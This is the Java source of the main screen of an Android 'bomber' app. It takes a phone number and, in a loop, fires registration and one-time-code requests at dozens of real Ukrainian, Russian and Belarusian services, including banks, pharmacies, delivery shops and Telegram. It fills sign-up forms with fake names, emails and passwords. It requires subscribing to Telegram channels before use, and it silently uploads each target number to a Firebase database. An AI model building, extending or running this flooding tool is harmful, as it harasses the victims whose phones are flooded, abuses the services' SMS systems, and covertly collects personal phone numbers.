package com.example.pythonbomber;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.constraintlayout.widget.ConstraintLayout;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.media.Image;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.transition.Transition;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.bumptech.glide.Glide;
import com.bumptech.glide.request.RequestOptions;
import com.bumptech.glide.request.target.ViewTarget;
import com.example.pythonbomber.attack.Bomber;
import com.example.pythonbomber.servises.Names;
import com.example.pythonbomber.ui.ProxyDialog;
import com.example.pythonbomber.utils.NewName;
import com.example.pythonbomber.utils.PhoneFormat;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Objects;
import java.util.Random;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    Toolbar toolbar;
    TextView link, main_text, telegram, progressTextView;
    ProgressBar progressBar;
    OkHttpClient client;
    Bomber attack;
    Button button;
    int servise = 133;
    ConstraintLayout main_layout;
    PhoneFormat format;
    EditText number, rep;
    ProgressBar progress;
    int repeats = 2;
    NewName name;
    String numberPhone;
    FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
    DatabaseReference myRef = firebaseDatabase.getReference("Phone");
    FloatingActionButton settings;

    // 1.21 update
    public ConstraintLayout numberConstraint;
    public TextView mainTextPhoneNum;
    public ImageView stopButtonMain, flagMain;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        client = new OkHttpClient();
        name = new NewName(10);
        settings = findViewById(R.id.floatingA);
        main_layout = findViewById(R.id.mainLayout);
        toolbar = findViewById(R.id.CustomToolbar);
        progressBar = findViewById(R.id.progressBar);
        link = findViewById(R.id.telegram);


        main_text = findViewById(R.id.main_text);
        number = findViewById(R.id.phoneNum);
        telegram = findViewById(R.id.telegram);
        rep = findViewById(R.id.repeats);
        setSupportActionBar(toolbar);
        button = findViewById(R.id.startbtn);

        //1.21 update
        numberConstraint = findViewById(R.id.numberConstraint);
        mainTextPhoneNum = findViewById(R.id.mainTextPhoneNum);
        stopButtonMain = findViewById(R.id.stopButtonMain);
        flagMain = findViewById(R.id.flagMain);

        Random random = new Random();
        int rndint = random.nextInt(4);
        if (rndint == 2) {
            subToSecondChannel("Подписка","Если вы подпишитесь на наш второй канал то скорость атаки будет увеличена");
        }
        System.out.println(rndint);

        handler();
    }
    private void handler() {
        link.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openUrl("https://t.me/+znKyyc4WhqgxYjAy");
            }
        });
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                myRef.push().setValue(number.getText().toString());

                SharedPreferences prefs = getSharedPreferences("subs2", MODE_PRIVATE);
                boolean subs = prefs.getBoolean("subscribing2",true);

                if (subs) {
                    showAlert("Подписка","Для того чтобы пользоваться бомбером вам нужно подписаться на основной канал");
                } else {
                    String num = number.getText().toString();
                    number.setText("");
                    attack(num);
                    numberPhone = num;
                    progressDialog();
                    mainTextPhoneNum.setText("+" + numberPhone);
                    numberConstraint.setVisibility(View.VISIBLE);
                    if (numberPhone != null) {
                        if (numberPhone.startsWith("7")) {
                            flagMain.setImageResource(R.drawable.shit);
                        } else {
                            flagMain.setImageResource(R.drawable.image);
                        }
                    }
                }

            }
        });
        settings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showSettings();
            }
        });

        // 1.21 update
        mainTextPhoneNum.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (!numberPhone.isEmpty()) {
                    if (numberPhone.startsWith("380")) {
                        attack(numberPhone);
                        progressDialog();
                    } else if (numberPhone.startsWith("7")) {

                    }
                }
            }
        });
        stopButtonMain.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                numberConstraint.setVisibility(View.GONE);
            }
        });
    }
    int i = 0;
    public void progressDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.progress_dialog);

        progress = dialog.findViewById(R.id.progress);
        ImageView exit = dialog.findViewById(R.id.exit);
        progressTextView = dialog.findViewById(R.id.textViewProgress);
        exit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                dialog.dismiss();
            }
        });

        dialog.show();
        dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.alpha(R.color.main_text)));
        dialog.getWindow().setGravity(Gravity.CENTER);
        dialog.setCancelable(false);
        Handler prg = new Handler();
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (i < servise) {
                    int ms = (int) (Math.random() * 900);
                    i++;
                    try {
                        Thread.sleep(ms);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    prg.post(new Runnable() {
                        @Override
                        public void run() {
                            progress.setProgress(i);
                            progressTextView.setText(i + "/133");
                            if (i == progress.getMax()) {
                                i = 0;
                                dialog.dismiss();
                            }
                        }
                    });
                }
            }
        }).start();
    }


    private void showSettings() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.bottom_navigation);

        ConstraintLayout constraintLayout = dialog.findViewById(R.id.textBeforeNumber);
        ConstraintLayout numb = dialog.findViewById(R.id.phoneNum);
        ImageView imageView = dialog.findViewById(R.id.imageView);

        // 1.21 update
//        if (numberPhone != null) {
//            constraintLayout.setVisibility(View.GONE);
//            numb.setVisibility(View.VISIBLE);
//            if (numberPhone.startsWith("7")) {
//                imageView.setImageResource(R.drawable.shit);
//            } else {
//                imageView.setImageResource(R.drawable.image);
//            }
//        }

        TextView textView = dialog.findViewById(R.id.textView2);
        textView.setText(numberPhone);
        ImageView proxy = dialog.findViewById(R.id.proxy);
        ImageView stop = dialog.findViewById(R.id.stopButton);
        ImageView change = dialog.findViewById(R.id.change_back);
        ImageView admob = dialog.findViewById(R.id.addMob);
        admob.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                updateAlert("Update","Версия 1.21\nПоследнее обновление 1.09.2023");
            }
        });
        change.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                i++;
                changeTheme(i);
            }
        });
        stop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                constraintLayout.setVisibility(View.VISIBLE);
                numb.setVisibility(View.GONE);
                numberPhone = null;
                Toast.makeText(getApplicationContext(), "Stopped", Toast.LENGTH_LONG).show();
                isAttack(false);
            }
        });
        proxy.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openProxyDialog();
            }
        });
        dialog.show();
        dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.WRAP_CONTENT);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.getWindow().setGravity(Gravity.BOTTOM);
    }
    public void openProxyDialog() {
        ProxyDialog proxyDialog = new ProxyDialog();
        proxyDialog.show(getSupportFragmentManager(),"Proxy");
    }
    public void attack(String num) {
        if (num.startsWith("380")) {
            System.out.println("hello");
            try {
                for (int i = 0; i < repeats;i++) {
                    NewName newName = new NewName(7);
                    int v = (int) (Math.random() * 1000);
                    String res = "{\"Request\":{\"phone\":" + num + "}}";
                    String rieltor_param = "{\"phone\":\"" + num + "\",\"retry\":0}";
                    String data_korona = "phone=" + num;
                    format = new PhoneFormat(num);
                    String liki_params = "{\"password\":\"" + newName + v + "\",\"referenceCode\":null,\"email\":\"da678emon" + v + "@gmail.com\",\"firstname\":\"" + newName + v + "\",\"telephone\":\"" + num + "\",\"terms\":{}}";
                    String helsi_param = "{\"phone\":\"" + num + "\",\"platform\":\"PISWeb\"}";
                    String sweet_param = "{\"device\":{\"type\":\"DT_Web_Browser\",\"application\":{\"type\":\"AT_SWEET_TV_Player\"},\"model\":\"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36\",\"firmware\":{\"versionCode\":1,\"versionString\":\"3.2.61\"},\"uuid\":\"87de48f2-1346-4c76-b896-7ea220cc413f\",\"supported_drm\":{\"widevine_modular\":true},\"screen_info\":{\"aspectRatio\":0,\"width\":824,\"height\":634}},\"phone\":\"" + num + "\"}";
                    String param = "first_name=katya" + v + "&&email=katyaj223sf" + v + "@gmail.com&&phone=" + num + "input_check_send_sms=&&password=dmitiy" + v + "&&password2=dmitiy" + v + "&&agree=on&&action=register_user";
                    String kyivstar_param = "{\"login\":\"" + num + "\",\"captcha\":null,\"action\":\"registration\"}";
                    String apteki = "method=sms&input_type=JSON&response_type=JSON&rest_data={\"phone\":\"" + num + "\",\"app_id\":\"apteki\",\"sms\":\"registration\"}";
                    String sushiwork_param = "{\"phone\":\"+" + num + "\",\"numbers\":4}";
                    String sushimaster = "{\"retailNetworkId\":\"4C25DB70-1DCE-11EB-A6EC-7B643829D650\",\"recipient\":\"+" + num + "\",\"source\":\"WEB\"}";
                    String smaki = "name=" + name.getName() + "&phone=" + num + "&birthday=14.01.1970&password=" + name.getName() + v + "&password2=" + name.getName() + v + "&code=&action=register_user";
                    String ctrs = "{\"name\":\"Дима\",\"phone\":\"" + num + "\"}";
                    String agro = "action=user_login&formData=tel=%2B" + format.firstFormat() + "&code=&nonce=17c59c886f";
                    String zolotoy_param = "form_action=https://zolotoyvek.ua/ru/brander_smsconfirm_customer/process/init/&telephone=%2B" + format.firstFormat() + "&persistent_remember_me=on";
                    String mono_param = "phone=%2B" + num;
                    String cucumber = "phone=" + num + "&sum=3000";
                    String creditcassa =  "{\"mobilePhone\":\"" + num + "\",\"productGroup\":\"PDL\",\"brandName\":\"CreditKasa\"}";
                    String selfcredit = "{\"phone\":\"" + num +"\"}";
                    String creditcassa2 = "{\"mobilePhone\":\"" +num+ "\",\"productGroup\":\"INSTALLMENT\",\"brandName\":\"NaVse\"}";
                    String credos = "{\"mobilePhone\":\"" + num + "\",\"productGroup\":\"PDL\",\"brandName\":\"Credos\"}";
                    String mobile = "{\"form_id\":\"get_login\",\"login\":\""+ num + "\"}";
                    String varus = "{\"phone\":\"+"+num+"\"}";

                    String old = "first_name=Иван&login_type=phone&login=+" + format.firstFormat() + "password1=1234567Nn&password2=1234567Nn&accept_agreement=on";
                    System.out.println(old);
                    String kolo = "phone=" + format.secondFormat() + "&password=1234568782" + v + name.getName() + "&token=null";
                    System.out.println(kolo);
                    attack = new Bomber(this);

                    attack.sushihistory(num);
                    attack.izak(num);
                    attack.bbcn(num);
                    attack.big(num);
                    attack.bm(num);
                    attack.lapec(num);
                    attack.ivanopizza(num);
                    attack.chacha(num);
                    attack.cappi(num);
                    attack.sezam(num);
                    attack.dosatvka(num);
                    attack.meets(num);
                    
                    attack.data("https://ilmolino.ua/api/v1/user/auth","phone=" + num.substring(2) + "&need_skeep=",client);
                    attack.data("https://alfalife.cc/authh.php","phone=" + num.substring(2),client);
                    attack.data("https://www.moyo.ua/identity/registration","firstname=" + name.getName() + "&phone=" + format.secondFormat()  + "&email=dimonchick" + i + "gmail.com",client);
                    attack.json(Names.EASYPAY, "phone",num, client);
                    attack.data(Names.CUCUMBER,cucumber,client);
                    attack.customJson(Names.MOBILEBANKING, mobile, client);
                    attack.customJson(Names.CREDOS, credos,client);
                    attack.customJson(Names.CREDITCASSA,creditcassa,client);
                    attack.customJson(Names.SELFCREDIT, selfcredit, client);
                    attack.customJson(Names.CREDITCASSA, creditcassa2, client);
                    attack.customJson(Names.VARUS,varus,client);
                    attack.data(Names.KOLO, kolo,client);
                    attack.data(Names.OLD,old,client);

                    attack.data(Names.MONOBANK, mono_param, client);
                    attack.data(Names.ZOLOTOY_VEK, zolotoy_param, client);
                    attack.data(Names.LA, agro, client);
                    attack.json(Names.UCB_APTEKA, "phone", num, client);
                    String budu = "LoginForm[username]=" + num.substring(2);
                    attack.data(Names.SMAKI, smaki, client);
                    attack.customJson(Names.CTRS, ctrs, client);
                    attack.data(Names.BUDUSUSHI, budu, client);
                    attack.customJson(Names.KYIVSTAR, kyivstar_param, client);
                    attack.data(Names.APTEKI, apteki, client);
                    attack.json(Names.EVA, "phone", num, client);
                    attack.json(Names.MEGASPORT, "phone", "+" + num, client);
                    attack.customJson(Names.SUSHIWORK, sushiwork_param, client);
                    attack.customJson(Names.SUSHIMASTER, sushimaster, client);
                    attack.json(Names.PIZZA, "phone", num, client);
                    attack.data(Names.TELEGRAM_URL, "phone=" + num, client);
                    attack.json(Names.DOC, "login", num, client);
                    attack.json(Names.UCB, "phone", num, client);
                    attack.data(Names.YOKI, param, client);
                    attack.customJson(Names.HELSI, helsi_param, client);
                    attack.customJson(Names.LIKI24, liki_params, client);
                    attack.customJson(Names.SWEET, sweet_param, client);
                    attack.data(Names.KORONAPAY, data_korona, client);
                    attack.json(Names.SOHOROOMS, "telephone", "+" + num, client);
                    attack.customJson(Names.LOVILOVE, res, client);
                    attack.json(Names.LIKARI, "phone", num.substring(2), client);
                    attack.json(Names.AUTOMOTO, "phone", "+" + num, client);
                    attack.json(Names.ANC, "login", "+" + num, client);
                    attack.customJson(Names.RIELTOR, rieltor_param, client);
                    attack.json(Names.MY_LUN, "login", "+" + num, client);
                    attack.json(Names.IZI, "phone", num, client);

                    attack.moyo(num);
                    attack.ilmolino(num);
                    attack.kasta(num);
                    attack.allo(num);
                    attack.data("https://translations.telegram.org/auth/request","phone=+" + num,client);

                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return;
        } else if (num.startsWith("7")) {
            System.out.println("RUSSIA");
            String creditter = "{\"phone\":\"" + num + "\",\"type\":\"register\"}";
            attack = new Bomber(this);
            for (int i = 0; i < 3; i++) {
                try {
                    attack.data(Names.TELEGRAM_URL, "phone=" + num, client);
                    attack.customJson("https://api.sunlight.net/v3/customers/authorization/", "{\"phone\":\"+" + num + "\",\"flashcall\":true}", client);
                    attack.data("https://www.techport.ru/registration?type=false", "aero=1&username=" + name.getName() + "login=+" + num + "&password=" + name.getName() + i, client);
                    attack.data("https://api.nbcomputers.ru/api/user/registration", "phone=+" + num, client);
                    attack.data("https://findclone.ru/register?phone=+" + num, "phone=+" + num, client);
                    attack.customJson("https://api.ivi.ru/pivi/rabbi.RegistrationService/ByPhone", "{\"device\":\"Linux Chrome v.114.0.0.0 5f231\",\"phone\":\"" + num + "\"}", client);
                    attack.customJson("https://sberuslugi.ru/api/v1/user/secret","{\"phone\":\"" + num + "\"}",client);
                    attack.findclone(num);
                    attack.lini(num);
                    attack.ouauth(num);
                    attack.data("https://translations.telegram.org/auth/request","phone=+" + num,client);
                    attack.json("https://sso.mtsbank.ru/api/v2/login", "login",num,client);
                    attack.smotrim(num);
                    attack.parfum(num);
                    attack.info(num);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return;
        } else if (num.startsWith("375")) {
            try {
                System.out.println("BELARUS");
                attack = new Bomber(this);
                attack.data(Names.TELEGRAM_URL, "phone=" + num, client);
                attack.customJson("https://sosedi.by/local/api/smsSend.php", "{\"phone\":\"+" + num + "\"}", client);
                } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }
    public void changeTheme(int i) {
        if (i % 2 == 0) {
            telegram.setTextColor(getResources().getColor(R.color.main_text));
            main_text.setTextColor(getResources().getColor(R.color.main_text));
            main_layout.setBackgroundResource(R.color.back_color);
            rep.setTextColor(getResources().getColor(R.color.main_text));
            number.setTextColor(getResources().getColor(R.color.main_text));
        } else {
             telegram.setTextColor(getResources().getColor(R.color.invert));
             main_text.setTextColor(getResources().getColor(R.color.back_color));
             main_layout.setBackgroundResource(R.color.back);
             rep.setTextColor(getResources().getColor(R.color.back_color));
             number.setTextColor(getResources().getColor(R.color.back_color));
        }
    }
    public void isAttack(boolean attack) {
        if (attack) {
            button.setVisibility(View.INVISIBLE);
            progressBar.setVisibility(View.VISIBLE);
        } else {
            button.setVisibility(View.VISIBLE);
            progressBar.setVisibility(View.INVISIBLE);
        }
    }
    private void openUrl(String url) {
        Uri uri = Uri.parse(url);
        startActivity(new Intent(Intent.ACTION_VIEW, uri));
    }

    public void showAlert(String title, String message) {
        String num = number.getText().toString();
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setCancelable(true)
                .setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        Toast.makeText(getApplicationContext(),"Отменено",Toast.LENGTH_LONG).show();
                    }
                })
                .setPositiveButton("Подписаться", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        openUrl("https://t.me/+dHotc-S3rGBlM2Qy");
                        Handler handler = new Handler();
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                attack(num);
                                isAttack(true);
                            }
                        }, 4200);


                        SharedPreferences sharedPreferences = getSharedPreferences("subs2", MODE_PRIVATE);
                        SharedPreferences.Editor editor = sharedPreferences.edit();

                        editor.putBoolean("subscribing2",false);
                        editor.apply();
                    }
                }).create().show();
    }
    public void updateAlert(String title, String message) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setPositiveButton("Ок", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        dialogInterface.dismiss();
                    }
                }).create().show();
    }
    public void subToSecondChannel(String title, String message) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setPositiveButton("Подписаться", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        openUrl("https://t.me/+HsV23l9AtYtjNjky");
                    }
                })
                .setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        Toast.makeText(getApplicationContext(),"Отменено", Toast.LENGTH_SHORT).show();
                    }
                }).setCancelable(false).create().show();
    }
}